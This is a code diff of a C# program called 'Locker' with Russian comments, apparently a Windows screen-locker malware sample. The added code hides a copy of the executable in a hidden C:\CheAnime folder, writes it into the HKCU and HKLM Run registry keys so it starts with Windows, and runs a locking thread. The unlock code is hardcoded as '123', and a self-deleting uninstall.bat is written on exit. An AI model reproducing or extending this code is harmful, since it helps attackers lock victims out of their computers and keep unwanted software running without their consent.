@@ -73,28 +73,43 @@ namespace Locker
             #region defining
 
             //Создание копии в скрытой папке
-            string targetPath = @"C:\Users\CheAnime\";
-            Directory.CreateDirectory(targetPath);
-            DirectoryInfo dir = new DirectoryInfo(targetPath);
-            dir.Attributes |= FileAttributes.Hidden;
-            string sourceFile = System.Windows.Forms.Application.ExecutablePath;
-            string destFile = System.IO.Path.Combine(targetPath, "AnimeLocker.exe");
-            if (System.Windows.Forms.Application.ExecutablePath != destFile)
+            string targetPath = @"C:\CheAnime\";
+            if(!Directory.Exists(targetPath))
             {
+                Directory.CreateDirectory(targetPath);
+                DirectoryInfo dir = new DirectoryInfo(targetPath);
+                dir.Attributes |= FileAttributes.Hidden;
+            }
+            string sourceFile = System.Windows.Forms.Application.ExecutablePath;
+            string destFile = System.IO.Path.Combine(targetPath, "Locker.exe");
+            
+
+            if (System.Windows.Forms.Application.ExecutablePath != destFile)
+            {        
                 System.IO.File.Copy(sourceFile, destFile, true);
+                //Добавление копии в автозапуск
+                string name = "Locker";
+                string ExePath = destFile;
+                Microsoft.Win32.RegistryKey reg;
+                reg = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
+                try
+                {
+                    reg.SetValue(name, ExePath);
+                    reg.Close();
+                }
+
+                catch (Exception ex) { MessageBox.Show(ex.Message); }
+                reg = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run");
+                try
+                {
+                    reg.SetValue(name, ExePath);
+                    reg.Close();
+                }
+
+                catch (Exception ex) { MessageBox.Show(ex.Message); }
             }
 
-            //Добавление копии в автозапуск
-            string name = "AnimeLocker";
-            string ExePath = destFile;
-            Microsoft.Win32.RegistryKey reg;
-            reg = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
-            try
-            {
-                reg.SetValue(name, ExePath);
-                reg.Close();
-            }
-            catch (Exception ex) { MessageBox.Show(ex.Message); }
+            
 
             //Начинка
             this.MaximizeBox = false;
@@ -108,7 +123,7 @@ namespace Locker
             //Sound.PlayLooping();
 
             #endregion
-
+            
             Sound = new SoundPlayer(Properties.Resources.Music);
             locker_thread = new Thread(LockIn);
             locker_thread.Start();
@@ -121,8 +136,28 @@ namespace Locker
         private void Form1_FormClosed(object sender, FormClosedEventArgs e)
         {
             //Sound.Stop();
-            locker_thread.Abort();           
+            locker_thread.Abort();
+            if(Program.Allow_exit)
+            {
+                using (StreamWriter sw = new StreamWriter(@"C:\uninstall.bat"))
+                {
+                    sw.WriteLine("@echo off");
+                    sw.WriteLine("taskkill /IM Locker.exe");
+                    sw.WriteLine("ping 127.0.0.1 -n 3 > nul");
+                    sw.WriteLine("rmdir /Q /S " + @"C:\CheAnime");
+                    sw.WriteLine("DEL \"%~f0\"");
+                    
+                }
+                System.Diagnostics.Process.Start(@"C:\uninstall.bat");
+            }
+           
         }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+
+        }
+
         private void button1_Click(object sender, EventArgs e)
         {
             if (textBox1.Text == "123") { exitbutton.Visible = true; k = 1; }
@@ -140,10 +175,19 @@ namespace Locker
                 reg.Close();
             }
             catch { }
+            reg = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run");
+            try
+            {
+                reg.DeleteValue("AnimeLocker");
+                reg.Close();
+            }
+            catch { }
             //Удаление папки с копией
-            string targetPath = @"C:\Users\CheAnime\";
+            /*
+            string targetPath = @"C:\CheAnime\";
             DirectoryInfo dir = new DirectoryInfo(targetPath);
             dir.Delete(true);
+            */
             #endregion
 
             Program.Allow_exit = true;
